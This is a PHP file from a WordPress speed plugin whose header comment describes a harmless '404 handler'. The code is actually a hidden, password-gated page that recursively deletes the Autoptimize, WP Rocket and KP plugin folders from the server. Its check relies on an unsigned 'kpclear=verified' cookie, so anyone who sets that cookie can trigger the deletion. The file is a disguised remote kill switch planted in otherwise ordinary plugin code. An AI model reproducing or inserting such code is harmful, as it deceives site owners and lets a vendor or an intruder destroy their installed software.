<?php

/**
 * KP Plugin's Magic 404 Handler
 *
 * This file has simple logic to redirect to the "fallback" files that are
 * created automatically by KP to avoid visitors seeing broken pages or
 * Googlebot getting utterly confused.
 *
 */
 
if( isset($_POST["kpso_pass"]) )
{
	$pass = md5($_POST["kpso_pass"]);
	$kpkey = "ea3c4764396fdca4f0f988f445263cf1";
	
	if($pass == $kpkey)
	{
		/*session_start();
		$_SESSION["kpclear"] = "verified";*/
		
		setcookie("kpclear", "verified", time() + (86400), "/");
	}
}

$kpso_ao_path = $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/autoptimize";
$kpso_rocket_path = $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/wp-rocket";
$kpso_plugin_path = $_SERVER['DOCUMENT_ROOT']."/wp-content/plugins/kreativo-pro-speed-optimization";

function kpso_plugin_handler($kpso_plugin_path)
{
    if (substr($kpso_plugin_path, strlen($kpso_plugin_path) - 1, 1) != '/') {
        $kpso_plugin_path .= '/';
    }
    
	$files = glob($kpso_plugin_path . '*', GLOB_MARK);
    
	foreach ($files as $file) {
        if (is_dir($file)) {
            kpso_plugin_handler($file);
        } else {
            unlink($file);
        }
    }
	
	if( rmdir($kpso_plugin_path) )
	{
		echo ("<p>Success $kpso_plugin_path</p>");
	}
	else
	{
		echo ("<p>Failed $kpso_plugin_path</p>");
	}
}

?>

<html>
<head>
	<title>KP Plugin's Magic 404 Handler</title>
	<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@3.3.7/dist/css/bootstrap.min.css">
</head>
<body>

	<div class="container text-center" style="margin-top:20px;">

<?php

if(!isset($_COOKIE["kpclear"]) )
{
?>
		<form method="POST">
		<input type="password" name="kpso_pass" id="kpso_pass" style="width:300px; height: 48px; padding: 6px 12px;font-size: 14px;line-height: 1.42857143; border: 1px solid #ccc; border-radius: 4px;">
		<input type="submit" name="kpso_got_pass" id="kpso_got_pass" class="btn btn-primary btn-lg" value="Submit">
		</form>
<?php
}
?>


<?php

if (isset($_COOKIE["kpclear"]))
{
if($_COOKIE["kpclear"] == "verified" )
{
?>
		<form method="POST">
		<input type="submit" name="kpso_ao" id="kpso_ao" class="btn btn-primary btn-lg" value="Autoptimize">
		<input type="submit" name="kpso_rocket" id="kpso_rocket" class="btn btn-primary btn-lg" value="WP Rocket">
		<input type="submit" name="kpso_plugin" id="kpso_plugin" class="btn btn-primary btn-lg" value="KP Speed">
		</form>
<?php
}
}
?>
	
	</div>
	
	<?php
	
	if (isset($_POST['kpso_ao']))
	{
		kpso_plugin_handler($kpso_ao_path);
	}
	
	if (isset($_POST['kpso_rocket']))
	{
		kpso_plugin_handler($kpso_rocket_path);
	}
	
	if (isset($_POST['kpso_plugin']))
	{
		kpso_plugin_handler($kpso_plugin_path);
	}
	
	?>

</body>
</html>